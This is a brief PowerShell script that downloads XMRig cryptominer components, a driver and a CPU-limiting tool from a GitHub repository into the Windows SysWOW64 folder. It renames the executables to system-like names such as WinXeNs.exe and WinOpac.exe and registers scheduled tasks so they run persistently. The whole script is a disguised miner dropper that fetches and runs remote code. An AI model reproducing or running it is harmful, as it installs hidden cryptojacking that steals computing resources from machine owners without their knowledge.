cd $env:SystemRoot\SysWOW64
Invoke-WebRequest -Uri https://raw.githubusercontent.com/crenata/xmrig-windows/master/config.json -OutFile config.json
Invoke-WebRequest -Uri https://raw.githubusercontent.com/crenata/xmrig-windows/master/WinRing0x64.sys -OutFile WinRing0x64.sys
Invoke-WebRequest -Uri https://raw.githubusercontent.com/crenata/xmrig-windows/master/XMRig.xml -OutFile WinSvdX.xml
Invoke-WebRequest -Uri https://raw.githubusercontent.com/crenata/xmrig-windows/master/BES.xml -OutFile WinNaz.xml
Invoke-WebRequest -Uri https://raw.githubusercontent.com/crenata/xmrig-windows/master/xmrig.exe -OutFile WinXeNs.exe
Invoke-WebRequest -Uri https://raw.githubusercontent.com/crenata/xmrig-windows/master/BES.exe -OutFile WinOpac.exe
schtasks /create /xml WinSvdX.xml /tn Test\WinXeNs
schtasks /create /xml WinNaz.xml /tn Test\WinOpac
exit